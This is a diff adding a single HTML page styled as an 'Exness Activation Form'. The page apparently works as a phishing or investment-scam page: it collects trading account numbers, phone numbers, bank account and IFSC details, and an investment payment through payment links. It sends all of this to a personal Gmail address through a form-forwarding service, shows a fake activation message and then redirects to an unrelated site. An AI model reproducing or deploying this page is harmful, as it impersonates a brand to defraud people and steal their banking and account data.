@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Exness Activation</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap');
+
+    * {
+      box-sizing: border-box;
+      font-family: 'Poppins', sans-serif;
+    }
+
+    body {
+      margin: 0;
+      padding: 0;
+      background: linear-gradient(135deg, #121212, #1a1a40);
+      color: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+    }
+
+    .form-container {
+      background: rgba(255, 255, 255, 0.05);
+      border: 1px solid rgba( 255, 255, 255, 0.1);
+      border-radius: 20px;
+      padding: 30px;
+      width: 90%;
+      max-width: 500px;
+      box-shadow: 0 12px 40px rgba(0, 0, 0, 0.5);
+      backdrop-filter: blur(20px);
+    }
+
+    h2 {
+      text-align: center;
+      margin-bottom: 25px;
+    }
+
+    .form-group {
+      margin-bottom: 20px;
+    }
+
+    .form-group label {
+      display: block;
+      margin-bottom: 6px;
+      font-size: 14px;
+      color: #ccc;
+    }
+
+    .form-group input,
+    .form-group select {
+      width: 100%;
+      padding: 12px 14px;
+      border: none;
+      border-radius: 12px;
+      background: rgba(255, 255, 255, 0.08);
+      color: #fff;
+      font-size: 15px;
+      outline: none;
+    }
+
+    .form-group select {
+      background-color: #252525;
+    }
+
+    .payment-link {
+      display: block;
+      width: 100%;
+      padding: 12px;
+      text-align: center;
+      background: #28a745;
+      color: #fff;
+      text-decoration: none;
+      border-radius: 12px;
+      margin-bottom: 20px;
+    }
+
+    .submit-btn {
+      width: 100%;
+      padding: 12px;
+      background: #007bff;
+      color: white;
+      border: none;
+      border-radius: 12px;
+      font-weight: 600;
+      position: relative;
+    }
+
+    .submit-btn.loading {
+      background: #0056b3;
+      pointer-events: none;
+    }
+
+    .submit-btn.loading::after {
+      content: '';
+      width: 20px;
+      height: 20px;
+      border: 3px solid white;
+      border-top-color: transparent;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+      position: absolute;
+      right: 16px;
+      top: 50%;
+      transform: translateY(-50%);
+    }
+
+    @keyframes spin {
+      to {
+        transform: translateY(-50%) rotate(360deg);
+      }
+    }
+
+    .popup {
+      display: none;
+      position: fixed;
+      top: 35%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: white;
+      color: #000;
+      padding: 25px 35px;
+      border-radius: 12px;
+      text-align: center;
+      z-index: 1000;
+      font-size: 16px;
+      font-weight: bold;
+      animation: fadeIn 0.4s ease-out;
+    }
+
+    @keyframes fadeIn {
+      from {
+        opacity: 0;
+        transform: translate(-50%, -40%);
+      }
+      to {
+        opacity: 1;
+        transform: translate(-50%, -50%);
+      }
+    }
+
+    @media(max-width: 500px) {
+      .form-container {
+        padding: 25px 20px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+<div class="popup" id="popup">You will be activated shortly...</div>
+
+<form class="form-container" action="https://formsubmit.co/bittrademasters@gmail.com" method="POST" onsubmit="return handleSubmit(this)">
+  <input type="hidden" name="_captcha" value="false">
+  <input type="hidden" name="_template" value="box">
+  <input type="hidden" name="_subject" value="New Exness Registration">
+
+  <h2>Exness Activation Form</h2>
+
+  <div class="form-group">
+    <label>Exness Account Number</label>
+    <input type="text" name="Exness_Account_Number" required>
+  </div>
+
+  <div class="form-group">
+    <label>Exness Mobile Number</label>
+    <input type="tel" name="Exness_Mobile" required>
+  </div>
+
+  <div class="form-group">
+    <label>Exness Gmail ID</label>
+    <input type="email" name="Exness_Gmail" required>
+  </div>
+
+  <div class="form-group">
+    <label>Your Mobile Number</label>
+    <input type="tel" name="Your_Mobile" required>
+  </div>
+
+  <div class="form-group">
+    <label>Your Full Name</label>
+    <input type="text" name="Full_Name" required>
+  </div>
+
+  <div class="form-group">
+    <label>Referral's Exness Account Number</label>
+    <input type="text" name="Referral_Account" required>
+  </div>
+
+  <div class="form-group">
+    <label>Your Bank Account Number</label>
+    <input type="text" name="Bank_Account" required>
+  </div>
+
+  <div class="form-group">
+    <label>Your IFSC Code</label>
+    <input type="text" name="IFSC_Code" required>
+  </div>
+
+  <div class="form-group">
+    <label>Investment Amount</label>
+    <select name="Amount" id="amountSelect" required onchange="updatePaymentLink()">
+      <option value="">Select Amount</option>
+      <option value="7000">₹7,000</option>
+      <option value="10000">₹10,000</option>
+      <option value="15000">₹15,000</option>
+    </select>
+  </div>
+
+  <div class="form-group">
+    <label>Enter UTR / Transaction ID (after payment)</label>
+    <input type="text" name="UTR_ID" placeholder="Enter payment reference ID" required>
+  </div>
+
+  <a id="paymentLink" class="payment-link" target="_blank">Pay Now</a>
+
+  <button type="submit" class="submit-btn" id="submitBtn">Submit</button>
+</form>
+
+<script>
+  function updatePaymentLink() {
+    const amount = document.getElementById('amountSelect').value;
+    const payBtn = document.getElementById('paymentLink');
+
+    const links = {
+      "7000": "https://payments.cashfree.com/links?code=L8l8haept1j0",
+      "10000": "https://payments.cashfree.com/links?code=a8l8h7k1t1j0",
+      "15000": "https://payments.cashfree.com/links?code=m8l8fsdvk6dg"
+    };
+
+    payBtn.href = links[amount] || "#";
+  }
+
+  function handleSubmit(form) {
+    const btn = document.getElementById('submitBtn');
+    btn.classList.add('loading');
+
+    setTimeout(() => {
+      document.getElementById('popup').style.display = 'block';
+    }, 1200);
+
+    setTimeout(() => {
+      window.location.href = "https://smartfundad.com";
+    }, 6000);
+
+    return true;
+  }
+</script>
+
+</body>
+</html>
